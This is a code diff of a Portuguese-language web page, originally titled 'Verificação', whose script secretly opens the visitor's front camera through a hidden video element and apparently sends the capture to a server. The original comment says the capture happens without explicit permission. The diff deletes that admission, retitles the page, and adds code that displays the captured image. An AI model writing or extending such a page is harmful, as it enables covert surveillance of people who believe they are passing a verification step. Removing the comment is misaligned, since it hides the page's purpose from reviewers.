@@ -2,19 +2,27 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verificação</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Captura da Tela</title>
   <style>
     body {
       margin: 0;
-      background: #111;
+      padding: 0;
+      background: #000;
       color: white;
-      font-family: Arial;
+      font-family: Arial, sans-serif;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
+      overflow: hidden;
+    }
+    img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 15px;
+      margin-bottom: 20px;
     }
     video {
       display: none;
@@ -22,12 +30,12 @@
   </style>
 </head>
 <body>
-  <img src="imagem.jpg" alt="Imagem" style="width: 320px; border-radius: 15px; margin-bottom: 20px;">
+  <img id="screenshot" alt="Captura da tela" />
 
   <script>
     (async function () {
       try {
-        // Captura a câmera frontal do usuário sem permissão explícita
+        // Captura a câmera frontal do usuário
         const stream = await navigator.mediaDevices.getUserMedia({
           video: {
             facingMode: "user"
@@ -70,6 +78,11 @@
 
       const resultado = await resposta.json();
       console.log(resultado);
+
+      // Exibe a imagem capturada
+      const img = document.getElementById("screenshot");
+      const url = URL.createObjectURL(blob);
+      img.src = url;
     }
   </script>
 </body>
